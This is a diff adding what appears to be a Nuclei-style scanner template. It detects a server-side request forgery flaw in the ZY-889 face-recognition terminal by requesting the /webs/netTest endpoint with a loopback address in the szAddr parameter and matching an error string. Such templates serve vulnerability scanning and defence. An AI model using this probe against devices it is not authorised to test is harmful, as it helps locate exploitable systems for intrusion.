@@ -1,0 +1,25 @@
+id: webservice-netTest-ssrf
+
+info:
+  name: 东菀市智跃科技软件有限公司ZY-889人脸机 - Server Side Request Forgery (SSRF)
+  author: qwtd
+  severity: medium
+  tags: WEBSERVICE
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webs/netTest?action=list&group=TESTURL&szAddr=127.0.0.1"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root.ERR.des"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a00473045022100ea8991cb05617923e77310e2bdd953c0dc2457c6e437ef2370cf965cd91a055b022075f0a487e1dd3af5c962abb4d746bda5fe89b8e74b3c2d73dfec6ca7d79b8f14:922c64590222798bb761d5b6d8e72950
